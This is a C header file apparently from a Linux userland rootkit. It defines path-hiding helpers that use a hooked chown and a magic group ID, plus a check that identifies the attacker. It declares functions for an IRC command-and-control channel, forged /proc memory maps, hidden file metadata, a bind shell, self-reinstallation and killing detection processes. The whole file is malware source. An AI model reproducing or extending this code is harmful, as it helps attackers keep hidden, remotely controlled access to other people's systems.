#ifndef UTILS_H
#define UTILS_H

void commit_termicide(void){
    shutdown(sockfd,SHUT_RDWR);
    close(sockfd);
}

int magic_user(void){
    if(getgid() == MAGIC_GID)
        return 1;
    return 0;
}

int hidepath(const char *path){
    hook(o_chown, "chown");
    return o_chown(path, 0, MAGIC_GID);
}
int unhidepath(const char *path){
    hook(o_chown, "chown");
    return o_chown(path, 0, 0);
}

/* conn.c */
int read_line(int sock, char *buffer);
char *get_prefix(char *line);
char *get_username(char *line);
char *get_command(char line[]);
char *get_last_argument(char line[]);
char *get_argument(char line[], int argno);
void set_nick(int sock, char nick[]);
void send_user_packet(int sock, char nick[]);
void join_channel(int sock, char channel[]);
void send_pong(int sock, char argument[]);
void send_message(int sock, char to[], char message[]);
int setup_connection(void);
#define CMSG(msg) send_message(sockfd, CHANNEL, msg);

/* forge.c */
FILE *forge_maps(const char *pathname);
FILE *forge_smaps(const char *pathname);
FILE *forge_numamaps(const char *pathname);

/* hide.c */
int hxstat(const char *path);
int hfxstat(int fd);
int hxattr(const char *path);
int hfxattr(int fd);

/* misc.c */
char *get_fdname(int fd);
char *cprocname(void);
char *gcmdline(void);
void reinstall(void);
int create_bind_shell(int port);

/* proc.c */
int is_bad_proc(const char *filename);
DIR *open_procd(void);
int kill_self(void);
void kill_rk_procs(void);
int is_betrayed_alive(void);

#include "connection.c"
#include "cmds/utils.c"
#include "cmds/handler.c"
#include "forging.c"
#include "hiding.c"
#include "processes.c"
#include "misc.c"

#endif
